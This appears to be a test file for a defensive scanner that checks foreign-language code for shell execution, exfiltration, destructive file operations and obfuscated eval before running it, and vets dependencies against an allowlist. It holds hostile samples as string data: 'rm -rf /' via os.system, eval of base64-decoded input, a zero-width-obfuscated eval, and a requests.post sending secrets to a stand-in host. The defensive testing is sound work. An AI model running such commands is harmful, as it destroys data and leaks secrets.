// tests/semantics/polyglot_guard_test.sapp — stdlib/polyglot_guard.sapp
//
// A defensive gate for the polyglot boundary: BEFORE any foreign-language code is run via
// stdlib/polyglot, scan it for dangerous constructs (shell/exec, network exfil, destructive
// FS, dynamic eval/obfuscation) and vet its declared dependencies against an allowlist so a
// malicious or typosquatted library is caught. Canonicalizes with stdlib/deobfuscate first
// so zero-width / homoglyph tricks can't hide an `eval`. Pure + deterministic.

let PG = import("stdlib/polyglot_guard.sapp");
let GH = import("stdlib/gpu2d_host.sapp");
let U = import("stdlib/unicode.sapp");

fn fail(m) { throw "FAIL " + m; }
fn eq(a, b, m) { if a != b { fail(m + " got=[" + str(a) + "] want=[" + str(b) + "]"); } }
fn truthy(c, m) { if not c { fail(m); } }
fn falsy(c, m) { if c { fail(m); } }

// ── our own generated GPU host code is SAFE (no exec/network/destructive calls) ─────
let py = GH.emit_python_moderngl();
truthy(PG.scan(py, "python").safe, "generated moderngl host is safe");
truthy(PG.scan(GH.emit_rust_wgpu(), "rust").safe, "generated wgpu host is safe");
truthy(PG.scan(GH.emit_c_opengl(), "c").safe, "generated opengl host is safe");

// ── malicious code is flagged unsafe ────────────────────────────────────────────────
let evil = "import os\nos.system('rm -rf /')\n";
let r = PG.scan(evil, "python");
falsy(r.safe, "os.system + rm -rf is unsafe");
truthy(r.score > 0.5, "high risk score");
truthy(len(r.findings) >= 1, "findings reported");

// dynamic eval of decoded payload
falsy(PG.scan("eval(base64.b64decode(x))", "python").safe, "eval+base64 unsafe");
// network exfil
falsy(PG.scan("import requests; requests.post('http://x', data=secrets)", "python").safe, "network exfil unsafe");

// ── obfuscation can't hide the dangerous token: zero-width inside "eval" ─────────────
let ZW = U.from_codepoint(8203);
falsy(PG.scan("e" + ZW + "val(payload)", "python").safe, "zero-width-obfuscated eval still caught");

// ── dependency vetting: allowlist + unknown/typosquat detection ─────────────────────
let dv = PG.check_deps(["moderngl", "numpy", "evilpkg"], PG.known_libs());
eq(len(dv.unknown), 1, "one unknown dependency");
eq(dv.unknown[0], "evilpkg", "the unknown dep is flagged");
truthy(PG.check_deps(["moderngl", "PyOpenGL"], PG.known_libs()).ok_all, "known deps pass");

let oversized_scan = PG.scan(str_repeat("x", 1048577), "python");
falsy(oversized_scan.safe, "oversized source is unsafe");
falsy(oversized_scan.complete, "oversized source was not partially scanned");
truthy(oversized_scan.bounded, "oversized scan reports its bound");

let too_many_deps = [];
let dep_i = 0;
while dep_i < 257 { array_push(too_many_deps, "numpy"); dep_i = dep_i + 1; }
let bounded_deps = PG.check_deps(too_many_deps, PG.known_libs());
falsy(bounded_deps.ok_all, "oversized dependency lists fail closed");
falsy(bounded_deps.complete, "oversized dependency list is not partially accepted");

let malformed_allow = PG.check_deps(["numpy"], [42]);
falsy(malformed_allow.ok_all, "non-string allowlist entry fails closed");
falsy(malformed_allow.complete, "malformed allowlist is not partially trusted");

let detached = PG.known_libs();
detached[0] = "attacker-package";
eq(PG.known_libs()[0], "moderngl", "known library allowlist is detached from callers");

// ── assert_safe throws on danger, passes on safe ────────────────────────────────────
let threw = (try PG.assert_safe(evil, "python") catch "BLOCKED");
eq(threw, "BLOCKED", "assert_safe blocks malicious code");
PG.assert_safe(py, "python");   // must NOT throw for safe code

print "polyglot_guard_pass";
